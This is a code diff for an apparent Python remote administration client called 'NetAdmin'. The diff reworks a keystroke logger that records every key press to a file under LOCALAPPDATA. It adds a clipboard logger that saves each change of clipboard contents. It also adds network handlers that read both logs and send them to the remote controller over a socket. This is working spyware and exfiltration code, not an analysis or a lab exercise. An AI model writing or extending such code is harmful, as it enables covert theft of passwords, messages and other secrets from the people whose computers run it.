@@ -3,12 +3,16 @@ import ctypes
 import os
 import time
 import queue
+from collections import deque
+
 import cv2
 import keyboard
 import mss
 import numpy
 import sys
 import platform
+
+import pyperclip
 from tendo import singleton
 import pyautogui
 import win32com.client as com
@@ -22,6 +26,9 @@ from os import listdir
 from os.path import isfile, join
 from OpenConnectionHelpers import *
 from turbojpeg import TurboJPEG
+
+KEYLOG_PATH = os.path.join(os.getenv('LOCALAPPDATA'), "NetAdmin\\keylog.txt")
+CLIPBOARD_PATH = os.path.join(os.getenv('LOCALAPPDATA'), "NetAdmin\\clipboard.txt")
 
 jpeg = TurboJPEG()
 
@@ -211,33 +218,80 @@ def ActualDirectorySize(path, f):
             return 0 # signifying that the size of all accessible files (which is no files) is 0
     return size
 
-key_queue = queue.Queue()
+key_queue_lock = threading.Lock()
+key_queue = list()
+
+class KeyPressContainer:
+    def __init__(self, key):
+        if key == "space":
+            self.key = " "
+        elif len(key) > 1:
+            self.key = str.upper(key)
+        else:
+            self.key = key
+        self.total = 1
+
+    def inc(self):
+        self.total += 1
+
+    def __eq__(self, other):
+        return self.key == other.key
+
+    def __str__(self):
+        if len(self.key) > 1:
+            if self.total > 1:
+                return f" [{self.key} x{self.total}] "
+            else:
+                return f" [{self.key}] "
+        else:
+            return self.key*self.total
 
 def keyhook(event):
+    # make a keypress container out of the event
+    keyContainer = KeyPressContainer(event.name)
     if event.event_type == 'down':
-        if event.name == "space":
-            key_queue.put(" ")
-        else:
-            try:
-                iEvent = ord(event.name)
-            except:
-                iEvent = None
-            if iEvent:
-                if 126 >= iEvent >= 33:
-                    key_queue.put(str(event.name))
+        # if the key is already in the top of the queue, increment the total
+        with key_queue_lock:
+            # if queue has keys in it
+            if len(key_queue) > 0:
+                if key_queue[-1] == keyContainer:
+                    key_queue[-1].inc()
+                else:
+                    key_queue.append(keyContainer)
+
             else:
-                key_queue.put(f"{[str.upper(str(event.name))]}")
+                # try:
+                #     iEvent = ord(event.name)
+                # except:
+                #     iEvent = None
+                # if iEvent:
+                #     if 126 >= iEvent >= 33:
+                #         strPrev = str(event.name)
+                #         key_queue.put(strPrev)
+                # else:
+                key_queue.append(keyContainer)
 
 def keylogger():
     keyboard.hook(keyhook)
     while True:
-        if not key_queue.empty():
-            with open(os.path.join(os.getenv('LOCALAPPDATA'), "NetAdmin\\keylog.txt"), "a") as f:
-                f.write(f"[{datetime.datetime.now()}] ")
-                while not key_queue.empty():
-                    f.write(f"{key_queue.get()}")
-                f.write("\n")
-        time.sleep(10)
+        with key_queue_lock:
+            if len(key_queue):
+                with open(KEYLOG_PATH, "a") as f:
+                    f.write(f"[{datetime.datetime.now()}] ")
+                    while len(key_queue) > 0:
+                        f.write(str(key_queue.pop(0)))
+                    f.write("\n")
+        time.sleep(60)
+
+def clipboard_logger():
+    prevClip = None
+    while True:
+        cClip = pyperclip.paste()
+        if prevClip != cClip:
+            prevClip = cClip
+            with open(CLIPBOARD_PATH, "a") as f:
+                f.write(f"[{datetime.datetime.now()}] \n{cClip}\n")
+        time.sleep(2)
 
 @try_connection
 def main():
@@ -251,6 +305,10 @@ def main():
     # create keylogger
     thread = threading.Thread(target=keylogger)
     thread.start()
+
+    # create clipboard logger
+    thread2 = threading.Thread(target=clipboard_logger)
+    thread2.start()
 
     # create a socket
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -285,6 +343,16 @@ def main():
             if message['data'] == NetTypes.NetKeyboardAction.value:
                 print(f"Keyboard action request from {message['extra']}")
                 pyautogui.press(message['extra'], _pause=False)
+
+            elif message['data'] == NetTypes.NetGetKeylogger.value:
+                print(f"Keylogger request from {message['extra']}")
+                with open(KEYLOG_PATH, "r") as f:
+                    s.send(NetProtocol.packNetMessage(NetMessage(type=NetTypes.NetText, data=NetText(text=f.read()), id=id)))
+
+            elif message['data'] == NetTypes.NetGetClipboard.value:
+                print(f"Keylogger request from {message['extra']}")
+                with open(CLIPBOARD_PATH, "r") as f:
+                    s.send(NetProtocol.packNetMessage(NetMessage(type=NetTypes.NetText, data=NetText(text=f.read()), id=id)))
 
             elif message['data'] == NetTypes.NetMouseMoveAction.value:
                 print(f"Mouse action request from {message['extra']}")
